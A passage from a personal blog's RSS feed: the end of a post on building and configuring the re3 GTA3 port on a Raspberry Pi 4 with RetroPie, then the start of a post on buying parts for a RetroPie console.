Project&lt;/h2&gt;
&lt;p&gt;Breathe a sigh of relief… the hard part is done. Well… hopefully! I have seen lots of other users experience lots of bugs - black screens, compile issues, etc. But I didn’t experience that, and compiling the rest of the setup was a breeze. Anyway, a couple of finishing touches and some quality of life improvements still need to be achieved.&lt;/p&gt;
&lt;h3 id=&quot;getting-gta3-files&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#getting-gta3-files&quot; aria-label=&quot;getting gta3 files permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Getting GTA3 Files&lt;/h3&gt;
&lt;p&gt;To sum it up, you need the GTA3 install files to play re3. This aligns with other projects that reverse engineer games. A good example I have is &lt;a href=&quot;https://github.com/OpenDiablo2/OpenDiablo2&quot;&gt;OpenDiablo2&lt;/a&gt;. I love supporting the original developers - so I &lt;a href=&quot;https://store.steampowered.com/app/12100/Grand_Theft_Auto_III/&quot;&gt;purchased GTA3 from Steam&lt;/a&gt; and used those files. Since I have no Windows system, I did a little hack to download the Windows version, courtesy of an It’s FOSS tutorial on &lt;a href=&quot;https://itsfoss.com/steam-play/&quot;&gt;How to Play Windows-only Games on Linux with Steam Play&lt;/a&gt;. You can probably get these files from other sources - if you want to do that, you probably know where to look. One key piece of advice is to get the Windows version. Just to keep everyone on the same page, I copied my GTA3 files to a folder I made located at: &lt;code class=&quot;language-text&quot;&gt;~/ports/GTA3/GrandTheftAuto3&lt;/code&gt; on the Raspberry Pi.&lt;/p&gt;
&lt;h3 id=&quot;copying-across-re3-files&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#copying-across-re3-files&quot; aria-label=&quot;copying across re3 files permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Copying Across re3 Files&lt;/h3&gt;
&lt;p&gt;So far we have a compiled version of re3 and all the GTA3 game files. Now, time to merge them! There are two main things we need to copy across:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;re3 binary file (that we compiled)&lt;/li&gt;
&lt;li&gt;re3 gamefiles (provided in the re3 project)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Starting with the re3 binary. When we built re3 in the previous step, we created an executable file named &lt;code class=&quot;language-text&quot;&gt;re3&lt;/code&gt; - we need this to run GTA3. This is pretty easy to set up, just copy to executable to the root GTA3 folder.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cp ~/ports/GTA3/re3/bin/linux-arm64-librw_gl3_glfw-oal/Release/re3 ~/ports/GTA3/GrandTheftAuto3/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Just to reiterate - we want to copy the &lt;code class=&quot;language-text&quot;&gt;re3&lt;/code&gt; executable file to the root directory of the Windows GTA3 files. &lt;/p&gt;
&lt;p&gt;Next, we need to copy the “gamefiles” provided with re3 into the same Windows GTA3 files. These “gamefiles” are provided in the re3 code base and are essential for re3 to run. Similar process as above, copy the files across.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd ~/ports/GTA3/re3
cp -r gamefiles/* ~/ports/GTA3/GrandTheftAuto3/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;running-without-a-desktop-environment&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#running-without-a-desktop-environment&quot; aria-label=&quot;running without a desktop environment permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Running without a Desktop Environment&lt;/h3&gt;
&lt;p&gt;If you are running RetroPie without a desktop environment you can still invoke a graphical program from the terminal by installing a Display Server. This will give us the ability to run GUI apps without having an actual Desktop Environment. You should be able to install a minimal Display Server environment and get the &lt;code class=&quot;language-text&quot;&gt;startx&lt;/code&gt; command by installing the &lt;code class=&quot;language-text&quot;&gt;xserver-xorg&lt;/code&gt; and &lt;code class=&quot;language-text&quot;&gt;xinit&lt;/code&gt; packages.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;WARNING&lt;/strong&gt;: I have not tested just installing a minimal Display Server and running GTA3. I had already installed the LXDE desktop environment, so this step was not necessary for me. But I have done this before (on other systems) and am pretty positive this is the correct solution.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;sudo apt-get install --no-install-recommends xserver-xorg
sudo apt-get install --no-install-recommends xinit&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;After you have the &lt;code class=&quot;language-text&quot;&gt;startx&lt;/code&gt; command available, you should be able to change into the root directory of your GTA3 files and run the &lt;code class=&quot;language-text&quot;&gt;re3&lt;/code&gt; executable.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;WARNING&lt;/strong&gt;: At this point, we have made no configuration settings for re3 - and it will run terribly at first - it felt like I was getting 1 FPS, but unsure of the exact performance. Anyway, just exit the game once it starts and we will configure it in the next step.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd ~/ports/GTA3/GrandTheftAuto3
startx ./re3&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;configuring-re3-for-the-raspberry-pi&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#configuring-re3-for-the-raspberry-pi&quot; aria-label=&quot;configuring re3 for the raspberry pi permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Configuring re3 for the Raspberry Pi&lt;/h3&gt;
&lt;p&gt;So, you got this far. If you noticed some terrible performance running GTA3 on the Pi 4 - I had the same issue. You will need to modify a few settings to get this game running smoothly (ish). All the options we want are in the &lt;code class=&quot;language-text&quot;&gt;re3.ini&lt;/code&gt; file. This holds some general game settings. Open the file:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;nano ~/ports/GTA3/GrandTheftAuto3/re3.ini&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Find the &lt;code class=&quot;language-text&quot;&gt;[VideoMode]&lt;/code&gt; section at the bottom. These values can be edited to run GTA3 at a specific resolution, and if it is full screen or windowed. I choose full screen - so that when the game runs in low resolution, it stretches to the monitor’s size. This works pretty well and is an overall reasonable experience. The stretching is fine if you keep an aspect ratio that is the same as your screen. My settings are:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;[VideoMode]
Depth = 32
Height = 480
Subsystem = 0
Width = 640
Windowed = 0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;My TV has a 16:9 aspect ratio but I went with a 4:3 aspect ratio. I have yet to experiment with some other resolutions and test performance - but will hopefully do this in the future.&lt;/p&gt;
&lt;p&gt;Quick side note - I have a PS4 controller configured on my RetroPie and connected using Bluetooth. My controller worked out of the box without any changes or configuration.&lt;/p&gt;
&lt;h3 id=&quot;creating-a-retropie-ports-entry&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#creating-a-retropie-ports-entry&quot; aria-label=&quot;creating a retropie ports entry permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Creating a RetroPie Ports Entry&lt;/h3&gt;
&lt;p&gt;Final step! I don’t want to have to exit EmulationStation and run a command every time I want to play. Luckily we can use the &lt;strong&gt;Ports&lt;/strong&gt; menu available in Emulation Station. Below is a visual example of what the result of this is like:&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;gatsby-resp-image-figure&quot; style=&quot;&quot;&gt;
    &lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/6ad645a0adc4f1c9294992d583a1d567/d9199/retropie-ports-menu.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 55.69620253164557%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAABk0lEQVQoz42TSU7DQBBFPbTnqWPHISEEByFIHMECdiARsQAOgBCCHTfgeKxYcLLPLwc7CvPiqbrKXb+ru8qGYRjYwLJh2C6twpdv/8OASSzTbAL74xK3y2Oc1WMEjg3LMGHzm7KsNbYNVyk4tDpNEQVBs6cTHGYZtns9aM9DGfmo8hDjLIAOfKS+j4zErovIcRoCc1WEaytkFEuZFyq1FiziGCOKlnEEHSfwSUjiJEWSrvAp6jHRZuLJ7AhPD7c4HRaw6EvcJZ2g4qmCwyoEj7ifkKSA1cj+x7snvL684fnqvPElLjmdoGz+CxF1eKjJN728vsDz8gb3OzkMxfd0Vod2gm0Fv4mFYYh+v4/BYIBya4iRTjAucxRFAa11s29d4R+CUpkk1XWNxWKBw4MDzGra2Rz1fI6qqjYrbN/uJ+R94yTBZHe3YWcywXQ6RUWme3soWXXXFGm/tF7zSr0oQs6OyzqngKx7H35Bf5tXFkpORJ+dF9uuN8ZGBtRhwGUlnnSbvvexFmSIZZjbATe/+UPa2DvmZ/lxM3K7TAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;GTA3 on the RetroPie Ports menu&quot;
        title=&quot;GTA3 on the RetroPie Ports menu&quot;
        src=&quot;/static/6ad645a0adc4f1c9294992d583a1d567/f058b/retropie-ports-menu.png&quot;
        srcset=&quot;/static/6ad645a0adc4f1c9294992d583a1d567/c26ae/retropie-ports-menu.png 158w,
/static/6ad645a0adc4f1c9294992d583a1d567/6bdcf/retropie-ports-menu.png 315w,
/static/6ad645a0adc4f1c9294992d583a1d567/f058b/retropie-ports-menu.png 630w,
/static/6ad645a0adc4f1c9294992d583a1d567/40601/retropie-ports-menu.png 945w,
/static/6ad645a0adc4f1c9294992d583a1d567/d9199/retropie-ports-menu.png 960w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;
    &lt;figcaption class=&quot;gatsby-resp-image-figcaption&quot;&gt;&lt;p&gt;GTA3 on the RetroPie Ports menu&lt;/p&gt;&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Create a file in the RetroPie ports folder:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;cd ~/RetroPie/roms/ports
touch re3.sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Create a simple bash script that will change to the folder where the GTA3 executable is, and run it.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;#!/bin/bash
cd /home/pi/re3/GrandTheftAuto3
startx ./re3&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Make sure it has executable permissions:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;chmod u+x re3.sh&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Done!&lt;/p&gt;
&lt;h2 id=&quot;conclusion&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#conclusion&quot; aria-label=&quot;conclusion permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;This was a fun mini-project. GTA3 is an all-time classic for the ages. Running it on a RetroPie is awesome-sauce. To be honest, I haven’t had the time to play it much as I am currently trying to complete Tony Hawk Pro Skater version 1-4. In true completionist fashion, trying to complete everything for every skater in 4 games takes a while! Anyway, I hope you found this post interesting or informative. I might keep blogging about the RetroPie/Raspberry Pi - these little devices and the software they have are amazing! &lt;/p&gt;</content:encoded></item><item><title><![CDATA[RetroPie - Building a Retro Game Console in a Day]]></title><description><![CDATA[I have wanted a retro gaming setup for about 10 years! I have dabbled with a little emulation of older consoles from my childhood - things…]]></description><link>https://thomaslaurenson.com/blog/2021-02-20/retropie-building-a-retro-game-console-in-a-day/</link><guid isPermaLink="false">https://thomaslaurenson.com/blog/2021-02-20/retropie-building-a-retro-game-console-in-a-day/</guid><pubDate>Sat, 20 Feb 2021 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;I have wanted a retro gaming setup for about 10 years! I have dabbled with a little emulation of older consoles from my childhood - things like Sega Mastersystem, Playstation 1, and Amiga 500 emulation. In the past, I just set up an emulator on my Linux laptop (Thinkpad BTW) played around a little, tweaked some settings, then got bored. The problem was I wanted more games, more emulators for different platforms, and a proper controller instead of a keyboard/mouse. However, the biggest thing I wanted was to play something, not on my laptop. I sit at it all day for work, then after work for fun. I needed some better balance. I needed a console. Then I could be lazy and sit on the couch playing games! &lt;/p&gt;
&lt;p&gt;The solution: one Raspberry Pi and the RetroPie project. This blog takes us on a journey of me buying all the components and setting up a retro gaming console in a single day. This is not a tutorial per-se, but I have included some useful lessons learned.&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;gatsby-resp-image-figure&quot; style=&quot;&quot;&gt;
    &lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/96b993d1ca96c21511e7abab41d2d8e6/72e01/master-system-2.jpg&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 52.53164556962025%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAALABQDASIAAhEBAxEB/8QAGAAAAwEBAAAAAAAAAAAAAAAAAAMEAgX/xAAUAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAAGfHeWXCQ//xAAZEAEBAQADAAAAAAAAAAAAAAACAwEREhP/2gAIAQEAAQUCdrdp1ZqdxZ4hVrIcwOEf/8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAwEBPwE//8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAgEBPwE//8QAHBAAAgEFAQAAAAAAAAAAAAAAAAECERIhIlFh/9oACAEBAAY/AmnN44X3P0qiTcai1MdP/8QAGRABAQEBAQEAAAAAAAAAAAAAAREAITFB/9oACAEBAAE/IYR1ScYdRPC8TVCJkQlhwJz5zIAwz//aAAwDAQACAAMAAAAQqw//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAEDAQE/ED//xAAUEQEAAAAAAAAAAAAAAAAAAAAQ/9oACAECAQE/ED//xAAcEAEBAAIDAQEAAAAAAAAAAAABEQAhMUFhUYH/2gAIAQEAAT8QqllABR86yaOt09gm557g9K7G/mJzEWrLDqzDgsic2/Ocp0EyrvX3P//Z&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;The Sega MasterSystem II&quot;
        title=&quot;I want to emulate the Sega MasterSystem II (Image source: [WikiMedia Commons](https://commons.wikimedia.org/wiki/File:Master_System_II.jpg))&quot;
        src=&quot;/static/96b993d1ca96c21511e7abab41d2d8e6/828fb/master-system-2.jpg&quot;
        srcset=&quot;/static/96b993d1ca96c21511e7abab41d2d8e6/ff44c/master-system-2.jpg 158w,
/static/96b993d1ca96c21511e7abab41d2d8e6/a6688/master-system-2.jpg 315w,
/static/96b993d1ca96c21511e7abab41d2d8e6/828fb/master-system-2.jpg 630w,
/static/96b993d1ca96c21511e7abab41d2d8e6/0ede0/master-system-2.jpg 945w,
/static/96b993d1ca96c21511e7abab41d2d8e6/72e01/master-system-2.jpg 1024w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;
    &lt;figcaption class=&quot;gatsby-resp-image-figcaption&quot;&gt;&lt;p&gt;I want to emulate the Sega MasterSystem II (Image source: &lt;a href=&quot;https://commons.wikimedia.org/wiki/File:Master_System_II.jpg&quot;&gt;WikiMedia Commons&lt;/a&gt;)&lt;/p&gt;&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&quot;contents&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#contents&quot; aria-label=&quot;contents permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contents&lt;/h2&gt;
&lt;div class=&quot;table-of-contents&quot;&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1027-am-buying-the-equipment&quot;&gt;10.27 am: Buying the Equipment&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#1103-am-initial-installation&quot;&gt;11.03 am: Initial Installation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#1241-am-retropie-is-alive&quot;&gt;12.41 am: RetroPie is Alive!&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#basic-configuration---wifi-and-ssh&quot;&gt;Basic Configuration - WiFi and SSH&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#first-game&quot;&gt;First Game&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#lessons-learned&quot;&gt;Lessons Learned&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#where-do-i-get-roms-for-my-new-retropie&quot;&gt;Where do I get ROMS for my new RetroPie?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#where-do-i-put-my-roms-in-the-retropie-and-in-what-file-format&quot;&gt;Where do I put my ROMS in the RetroPie and in what file format?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#how-do-you-transfer-roms-to-your-retropie-via-ssh&quot;&gt;How do you transfer ROMS to your RetroPie via SSH?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#where-do-i-get-different-bios-files-for-my-new-retropie&quot;&gt;Where do I get different BIOS files for my new RetroPie?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#why-is-my-ps4-controller-blinking-white-when-connecting-to-the-retropie-via-usb&quot;&gt;Why is my PS4 controller blinking white when connecting to the RetroPie via USB?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#how-can-i-connect-my-ps4-controller-to-my-retropie-using-bluetooth&quot;&gt;How can I connect my PS4 controller to my RetroPie using Bluetooth?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h2 id=&quot;1027-am-buying-the-equipment&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#1027-am-buying-the-equipment&quot; aria-label=&quot;1027 am buying the equipment permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;10.27 am: Buying the Equipment&lt;/h2&gt;
&lt;p&gt;After a Saturday morning breakfast, I grabbed my wallet and headed to my favorite tech shop. It’s not my favorite, I just noticed they had the Pi 4 on sale that weekend. Anyway, while I was there I picked up the following items:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.raspberrypi.org/products/raspberry-pi-4-model-b/&quot;&gt;Raspberry Pi 4 Model B - 8GB&lt;/a&gt; for $120&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.raspberrypi.org/products/type-c-power-supply/&quot;&gt;Raspberry Pi 15.3W USB-C Power Supply&lt;/a&gt; in Black for $12&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.raspberrypi.org/products/micro-hdmi-to-standard-hdmi-a-cable/&quot;&gt;Micro HDMI to Standard HDMI Cable&lt;/a&gt; in Black for $14&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.playstation.com/en-nz/accessories/dualshock-4-wireless-controller/&quot;&gt;DualShock 4 Wireless Controller&lt;/a&gt; for $89&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://shop.westerndigital.com/en-au/products/memory-cards/sandisk-extreme-pro-uhs-ii-microsd&quot;&gt;Sandisk Extreme Pro 64GB&lt;/a&gt; for $47&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If the prices look high, they are in $NZD. And generally, tech is a little more expensive here. Adding everything together, a total of $282.&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/03bf06332eba03d7a691dcfb1c899d73/a3a5c/raspberry-pi-stuff.png&quot;
    style=&quot;display: block&quot;
